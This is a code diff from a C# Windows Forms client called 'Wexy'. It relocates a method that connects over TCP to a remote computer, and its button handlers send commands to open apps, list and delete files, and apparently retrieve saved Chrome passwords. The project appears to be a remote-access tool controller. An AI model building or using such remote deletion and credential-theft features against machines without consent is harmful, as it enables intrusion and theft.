@@ -184,33 +184,6 @@ namespace Wexy
             }
         }
 
-        private void MainForm_Load(object sender, EventArgs e)
-        {
-            RemoteComputerIP r = new RemoteComputerIP();
-            r.ShowDialog();
-            remotepcIp = r.GetIp();
-            remotepcPort = Int32.Parse(r.GetPort());
-            lbl_ip.Text = remotepcIp + ":"+ remotepcPort.ToString();
-
-            client = new TcpClient();
-            
-            try
-            {
-                client.Connect(remotepcIp, remotepcPort);
-                Writer = client.GetStream();
-                Receiver = client.GetStream();
-                SendCommand("pcname>");
-                lbl_pcname.Text = received_data;
-                SendCommand("getos>");
-                lbl_osversion.Text = received_data;
-            }
-            catch(Exception error)
-            {
-                MessageBox.Show("Could not connect to " + remotepcIp +"\n Error : "+error.Message);
-                Application.Exit();
-            }
-        }
-
         #region Buttons events
         private void btn_openwebsite_Click(object sender, EventArgs e)
         {
@@ -222,8 +195,6 @@ namespace Wexy
         {
             string app_name = txb_filelocation.Text;
             SendCommand("openApp>" + app_name);
-            //ReceiveData();
-            //MessageBox.Show(received_data);
         }
 
         private void btn_displaymessage_Click(object sender, EventArgs e)
@@ -234,7 +205,6 @@ namespace Wexy
 
         private void btn_showfiles_Click(object sender, EventArgs e)
         {
-            // I added ReceiveData() here because there is a bug when using args(instruction>args) , the data is not retrieved and is pending, so I call it again.
             if (txb_directorypath.Text[txb_directorypath.Text.Length - 1] == '/')
             {
                 lstbox_filesfolders.Items.Clear();
@@ -294,8 +264,6 @@ namespace Wexy
         {
             string location = txb_filelocation.Text;
             SendCommand("del>"+location+">");
-            //ReceiveData();
-            //MessageBox.Show(received_data);
         }
 
         private void btn_getchromepass_Click(object sender, EventArgs e)
@@ -390,7 +358,33 @@ namespace Wexy
             ReceiveData();
             MessageBox.Show(received_data);
         }
+        #endregion
 
-        #endregion   
+        private void MainForm_Load(object sender, EventArgs e)
+        {
+            RemoteComputerIP r = new RemoteComputerIP();
+            r.ShowDialog();
+            remotepcIp = r.GetIp();
+            remotepcPort = Int32.Parse(r.GetPort());
+            lbl_ip.Text = remotepcIp + ":" + remotepcPort.ToString();
+
+            client = new TcpClient();
+
+            try
+            {
+                client.Connect(remotepcIp, remotepcPort);
+                Writer = client.GetStream();
+                Receiver = client.GetStream();
+                SendCommand("pcname>");
+                lbl_pcname.Text = received_data;
+                SendCommand("getos>");
+                lbl_osversion.Text = received_data;
+            }
+            catch (Exception error)
+            {
+                MessageBox.Show("Could not connect to " + remotepcIp + "\n Error : " + error.Message);
+                Application.Exit();
+            }
+        }
     }
 }
